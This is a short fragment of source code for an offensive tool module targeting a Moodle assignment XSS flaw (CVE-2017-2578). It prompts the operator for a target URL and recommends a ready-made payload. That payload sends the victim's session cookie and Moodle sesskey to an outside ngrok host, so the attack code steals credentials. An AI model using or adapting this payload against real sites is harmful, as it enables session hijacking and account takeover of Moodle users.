...
module TMoodleActions
  class AssignmentXSS
    # CVE-2017-2578
    def perform(target)
      puts "[?] Enter an assignment URL e.g. http://localhost/mod/assign/view.php?id=2"
      assignment_url = gets().not_nil!
      puts "[?] Enter an XSS payload. It is recommended to follow this example, changing only the URL:\n\ndocument.body.appendChild(document.createElement('img')).src=('https://5fc418e2.ngrok.io/?session='.concat(document.cookie,'|',M.cfg.sesskey))"
